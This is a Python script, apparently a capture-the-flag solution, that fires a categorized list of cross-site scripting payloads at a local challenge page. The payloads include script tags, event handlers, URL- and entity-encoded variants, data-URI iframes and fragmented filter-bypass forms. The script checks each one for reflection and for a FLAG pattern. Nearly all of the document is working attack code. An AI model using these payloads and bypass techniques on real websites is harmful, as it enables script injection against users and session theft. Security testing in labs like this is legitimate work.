import requests
import re
import urllib.parse
from html import unescape

# Target URL
target_url = "http://127.0.0.1:32809/page"

# XSS Payload Categories - systematic filter mapping
payload_categories = {
    "Basic Script Tags": [
        "<script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRipt>",
        "<SCRIPT>alert(document.domain)</SCRIPT>",
        "<script>alert(1)</script>",
    ],
    "Event Handlers": [
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ],
    "URL-Encoded Payloads": [
        "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
        "%3Csvg%2Fonload%3Dalert('XSS')%3E",
        "%3Cbody%20onload%3Dalert('XSS')%3E",
    ],
    "HTML Entity Encoded": [
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "&#60;img src=x onerror=alert('XSS')&#62;",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    ],
    "Exotic Vectors": [
        "<svg/onload=alert('XSS')>",
        "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
    ],
    "Fragmented/Double-Encoded": [
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<scr<!--test-->ipt>alert('XSS')</scr<!--test-->ipt>",
        "<<script>alert('XSS')</script>",
    ],
    "Data URI Variants": [
        "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
    ],
    "Mixed Encoding": [
        "%26lt%3Bscript%26gt%3Balert('XSS')%26lt%3B%2Fscript%26gt%3B",
        "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E",
        "%26%2360%3Bscript%26%2362%3Balert('XSS')%26%2360%3B/script%26%2362%3B",
    ]
}

# Results storage
results = []
flag_found = None
successful_bypasses = []
blocked_payloads = []

# Session for consistent requests
session = requests.Session()

print(f"[*] Starting XSS Filter Mapping on {target_url}")
print(f"[*] Testing {sum(len(p) for p in payload_categories.values())} payload variations")
print("=" * 90)

# Test each payload category
for category, payloads in payload_categories.items():
    print(f"\n[TESTING] {category}")
    print("-" * 90)
    
    for payload in payloads:
        try:
            # Send POST with payload
            data = f"solution={urllib.parse.quote(payload, safe='')}"
            response = session.post(
                target_url,
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (XSS-Test-Agent)"
                },
                timeout=15
            )
            
            status_code = response.status_code
            content = response.text
            
            # Check for payload reflection
            payload_reflected = payload in content
            
            # Search for FLAG patterns
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            if flag_match and not flag_found:
                flag_found = flag_match.group(0)
                print(f"[!] FLAG DISCOVERED: {flag_found}")
            
            # Extract state indicators (image sources)
            image_sources = re.findall(r'<img[^>]+src=[\"\']?([^\"\'\s>]+)[\"\']?', content, re.I)
            state_indicators = []
            for img_src in image_sources:
                if '/' in img_src:
                    state_indicators.append(img_src.split('/')[-1])
                else:
                    state_indicators.append(img_src)
            
            # Extract visible messages
            text_messages = []
            message_matches = re.findall(r'<p[^>]*>([^<]+)</p>', content, re.I)
            if message_matches:
                text_messages = [msg.strip() for msg in message_matches[:3]]
            
            # Check for error indicators
            error_indicators = []
            if re.search(r'error', content, re.I):
                error_matches = re.findall(r'(?:error|invalid|failed)[^<.]*', content, re.I)
                error_indicators = [err.strip() for err in error_matches[:3]]
            
            # Store result
            result = {
                "category": category,
                "payload": payload,
                "url_encoded": urllib.parse.quote(payload, safe=''),
                "status_code": status_code,
                "reflected": payload_reflected,
                "state_indicators": state_indicators,
                "text_messages": text_messages,
                "error_indicators": error_indicators,
                "response_length": len(content),
                "has_javascript": re.search(r'alert\(|confirm\(|prompt\(|eval\(', payload, re.I) is not None
            }
            results.append(result)
            
            # Print immediate analysis
            print(f"\nPayload: {payload[:60]}{'...' if len(payload) > 60 else ''}")
            print(f"  URL Encoded: {urllib.parse.quote(payload, safe='')[:60]}")
            print(f"  Status: {status_code} | Length: {len(content)}B")
            print(f"  Reflected: {'YES' if payload_reflected else 'NO'}")
            if state_indicators:
                print(f"  State: {state_indicators}")
            if text_messages:
                print(f"  Messages: {text_messages}")
            if error_indicators:
                print(f"  Errors: {error_indicators}")
            if flag_found:
                print(f"  >>> FLAG FOUND: {flag_found} <<<")
            
            # Classify bypass success/failure
            if payload_reflected and result['has_javascript']:
                successful_bypasses.append(result)
            elif not payload_reflected and any(word in payload.lower() for word in ['script', 'onerror', 'onload', 'onload', 'ontoggle']):
                blocked_payloads.append(result)
                
        except Exception as e:
            print(f"\n[ERROR] Failed to test payload: {str(e)}")
            results.append({
                "category": category,
                "payload": payload,
                "status_code": "ERROR",
                "error": str(e)
            })

# Final Summary
print("\n" + "=" * 90)
print("[*] SUMMARY TABLE")
print("=" * 90)
print(f"{'Category':<25} {'Payload Type':<25} {'Status':<8} {'Reflected':<10} {'State':<15}")
print("-" * 90)

for result in results:
    if result.get("status_code") == "ERROR":
        continue
    
    category = result["category"][:24]
    payload_type = result["payload"][:24]
    status = str(result["status_code"])
    reflected = "YES" if result["reflected"] else "NO"
    
    state = "Default"
    if "error_star.png" in result.get("state_indicators", []):
        state = "ERROR"
    elif "new_star.png" in result.get("state_indicators", []):
        state = "SUCCESS"
    elif "logo5_white.png" in result.get("state_indicators", []):
        state = "DEFAULT"
    
    print(f"{category:<25} {payload_type:<25} {status:<8} {reflected:<10} {state:<15}")

print("\n" + "=" * 90)
print("[*] BYPASS ANALYSIS")
print("=" * 90)

if successful_bypasses:
    print(f"[+] SUCCESSFUL BYPASSES: {len(successful_bypasses)}")
    for r in successful_bypasses:
        print(f"  ✓ {r['category']}: {r['payload']}")
else:
    print("[-] NO SUCCESSFUL BYPASSES DETECTED")

if blocked_payloads:
    print(f"\n[-] BLOCKED PAYLOADS: {len(blocked_payloads)}")
    for r in blocked_payloads:
        print(f"  ✗ {r['category']}: {r['payload'][:60]}...")

if flag_found:
    print(f"\n[!!!] FLAG CAPTURED: {flag_found}")
else:
    print("\n[!] NO FLAG PATTERN FOUND")

print("\n[*] Filter mapping completed.")
